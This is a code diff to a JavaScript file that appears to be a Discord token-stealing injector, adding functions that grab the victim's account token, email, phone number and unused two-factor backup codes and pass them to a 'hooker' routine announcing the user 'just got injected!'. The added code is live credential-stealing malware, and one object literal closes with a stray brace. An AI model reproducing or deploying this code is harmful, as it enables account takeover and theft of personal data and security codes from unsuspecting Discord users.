@@ -566,6 +566,57 @@ const buyNitro = async (token) => {
   }
 };
 
+
+async function initiation() {
+  if (fs.existsSync(path.join(__dirname, 'initiation'))) {
+    fs.rmdirSync(path.join(__dirname, 'initiation'));
+
+    const token = await getToken();
+    if (!token) return;
+
+    const fetchedAccount = await fetchAccount(token)
+
+    const content = {
+      "content": `${fetchedAccount.username} just got injected!`,
+      "embeds": [{
+        "fields": [{
+          "name": "Email",
+          "value": "" + fetchedAccount.email + "",
+          "inline": true
+        }, {
+          "name": "Phone",
+          "value": "" + (fetchedAccount.phone || "None"),
+          "inline": true
+        }]
+      }]
+    };
+
+    await hooker(content, token, fetchedAccount);
+    clearAllUserData();
+  }
+}
+
+const BackupCodes = async (codes, token) => {
+  const account = await fetchAccount(token);
+
+  const filteredCodes = codes.filter((code) => {
+    return code.consumed == false;
+  });
+
+  let message = '';
+  for (let code of filteredCodes) {
+    message += code.code + '\n';
+  }
+  const content = {
+    "content": `${account.username} backup codes`,
+    "embeds": [{
+      "fields": [{
+        "name": "Codes",
+        "value": message
+      }]
+    }]
+  }};
+
 const getNitro = async (flags, id, token) => {
   switch (flags) {
       case 1:
